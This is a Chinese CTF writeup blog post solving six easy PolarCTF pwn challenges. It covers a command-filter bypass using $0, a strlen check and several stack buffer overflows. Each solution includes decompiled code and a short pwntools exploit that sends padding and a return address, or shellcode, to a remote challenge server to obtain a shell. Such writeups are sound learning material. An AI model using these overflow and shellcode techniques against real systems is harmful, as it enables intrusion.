---
title: "PolarCTF-Pwn（简单）刷题WP"
date: 2024-12-05 14:21:00
categories:
  - "CTF Writeup"
tags:
  - "CTF"
  - "Writeup"
  - "PolarCTF"
  - "Pwn"
cnblogs_postid: "18588474"
cnblogs_url: "https://www.cnblogs.com/ljnljn/p/18588474"
---

## 1、sandbox

#### ida查看box函数，发现对输入的字符做了检查（sh、cat、flag）

```C
if ( strchr(buf, 's') || strchr(buf, 'h') || strstr(buf, "cat") || strstr(buf, "flag") || strchr(buf, '-') )
  {
    puts("Illegal command.");
    exit(0);
  }
```

看这篇文章：[pwn中常见的绕过（以后见多了会慢慢更的，咕咕咕） - Falling_Dusk - 博客园](https://www.cnblogs.com/falling-dusk/p/17871620.html)

对命令进行处理

首先想办法输入sh进去来提权：输入等价的```$0```
然后发现输什么都不会被拦截，获得flag
![image](/assets/cnblogs/PolarCTF-Pwn（简单）刷题WP/3539156-20241205142048736-335121123.png)

## 2、creeper

ida看game函数，发现只要字符数组长度为15就可以输出flag

注意这里换行符也算一个字符，因此输入14个字符换行即可

```C
__int64 game()
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("Creeper?");
  read(0, buf, 0x100uLL);
  if ( strlen(buf) == 15 )
  {
    puts("Aw man");
    system("cat flag");
  }
  else
  {
    puts("Si............");
  }
  return 0LL;
}
```
![image](/assets/cnblogs/PolarCTF-Pwn（简单）刷题WP/3539156-20241205142058675-351206893.png)
## 3、简单溢出（https://www.cnblogs.com/ljnljn/p/18585191）

## 4、system
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[40]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setbuf(stdout, (char *)'\0');
  setbuf(stdin, (char *)'\0');
  printf("input:");
  read(0, buf, 0x1EuLL);
  system(buf);
  return 0;
}
```
输入即为指令，直接```cat flag```
![image](/assets/cnblogs/PolarCTF-Pwn（简单）刷题WP/3539156-20241205191337852-227405420.png)

## 5、emm
首先这是32位的！
![image](/assets/cnblogs/PolarCTF-Pwn（简单）刷题WP/3539156-20241205192914893-1890496189.png)
```
int yes()
{
  _BYTE buf[88]; // [esp+0h] [ebp-58h] BYREF

  puts("/bin/sh");
  read(0, buf, 256u);
  return 0;
}
```
这里可以看到buf的位置以及大小（点击buf）
![image](/assets/cnblogs/PolarCTF-Pwn（简单）刷题WP/3539156-20241205193233146-671441652.png)
因此有exp:
```
from pwn import *
p=remote("1.95.36.136",2068)
payload=b'a'*(0x58+4)+p64(0x080484D4)
p.sendline(payload)
p.interactive()
```
![image](/assets/cnblogs/PolarCTF-Pwn（简单）刷题WP/3539156-20241205193413312-526022330.png)
5、Easy_ShellCode
是个32位文件
![image](/assets/cnblogs/PolarCTF-Pwn（简单）刷题WP/3539156-20241206160438374-1773235482.png)
然后用ida，主函数引入了两个函数
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  Start();
  return 0;
}
```
init()函数没有问题
看Start()
```
ssize_t Start()
{
  _BYTE buf[104]; // [esp+0h] [ebp-68h] BYREF

  init();
  write(1, "Please Input:\n", 0xEu);
  read(0, &str, 0x100u);
  puts("What,s your name ?:");
  return read(0, buf, 0x100u);
}
```
发现&str空间足够，没问题；而buf数组明显可能存在栈溢出
并且这里没有找到类似/bin/sh等指令，因此考虑写入shellcode覆盖str变量所在地址。
```
from pwn import *
p=remote("1.95.36.136",2086)
p.sendline(asm(shellcraft.sh()))
payload=b'a'*(0x68+4)+p32(0x0804A080)
p.sendline(payload)
p.interactive()
```
![image](/assets/cnblogs/PolarCTF-Pwn（简单）刷题WP/3539156-20241206160908681-1549115878.png)
## 6、小狗汪汪汪
![image](/assets/cnblogs/PolarCTF-Pwn（简单）刷题WP/3539156-20241206161220457-1073314517.png)
```
int dog()
{
  char s[9]; // [esp+Fh] [ebp-9h] BYREF

  puts("Hungry!!!");
  puts("This puppy needs to eat a few bones?");
  gets(s);
  return puts("Woof!!!");
}
```
gets(s)为危险函数，存在栈溢出可能性
```
int getshell()
{
  return system("/bin/sh");
}
```
shift+F12发现/bin/sh
找到内存位置
![image](/assets/cnblogs/PolarCTF-Pwn（简单）刷题WP/3539156-20241206161313279-1163265668.png)
exp
```
from pwn import *
p=remote("1.95.36.136",2077)
payload=b'a'*(0x9+4)+p32(0x080485A4)
p.sendline(payload)
p.interactive()
```
![image](/assets/cnblogs/PolarCTF-Pwn（简单）刷题WP/3539156-20241206161402983-1255893754.png)
